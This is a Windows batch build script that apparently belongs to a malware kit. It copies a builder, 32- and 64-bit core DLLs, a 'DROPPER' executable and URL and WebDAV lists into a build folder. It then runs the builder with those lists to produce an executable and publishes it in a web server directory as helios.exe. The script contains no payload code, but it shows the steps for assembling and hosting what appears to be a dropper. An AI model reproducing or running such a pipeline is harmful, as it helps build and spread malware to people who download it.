@echo off
cls
echo [+] REBUILD Script

echo [+] Removing current Build directory
del /Q Build\*.*
del /Q output.exe

echo [+] Copying required files...
echo -------------------------------------

copy Debug\BUILDER.exe Build\BUILDER.exe
copy Debug\CORE32.dll Build\CORE32.dll
copy Debug\DROPPER.exe Build\DROPPER.exe
copy x64\Debug\CORE64.dll Build\CORE64.dll
copy dbg.url_list.txt Build\dbg.url_list.txt
copy dbg.webdav_list.txt Build\dbg.webdav_list.txt

echo -------------------------------------
echo [+] Building...

"%CD%\Build\BUILDER.exe" -u "%CD%\dbg.url_list.txt" -d "%CD%\dbg.webdav_list.txt" -a 666 -w 777 -o output.exe -1 1 -2 1 -3 1 -4 1 -5 1 -6 1 -7 1 -i 50 -r 75 -t 30 -p 50
copy output.exe C:\httpd\htdocs\helios.exe

echo [+] Cleanup...
del /Q Build\*.*

echo [+] Done.